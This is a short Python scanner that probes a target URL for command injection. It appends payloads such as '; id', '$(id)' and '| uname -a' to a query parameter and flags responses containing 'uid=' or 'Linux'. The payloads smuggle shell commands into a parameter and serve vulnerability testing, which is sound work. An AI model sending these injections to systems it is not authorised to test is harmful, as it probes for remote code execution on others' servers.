import requests

# Common OS command payloads to test RCE
payloads = [
    "; id",
    "&& id",
    "| id",
    "`id`",
    "$(id)",
    "; uname -a",
    "&& uname -a",
    "| uname -a",
]

def scan_rce(target_url: str) -> dict:
    findings = []
    vulnerable = False

    for payload in payloads:
        try:
            # Append payload to a test query parameter
            test_url = f"{target_url}?vuln={payload}"
            response = requests.get(test_url, timeout=5)

            if "uid=" in response.text or "Linux" in response.text:
                findings.append({
                    "payload": payload,
                    "response_snippet": response.text[:300]
                })
                vulnerable = True
        except Exception as e:
            continue

    return {
        "target": target_url,
        "vulnerable": vulnerable,
        "findings": findings
    }
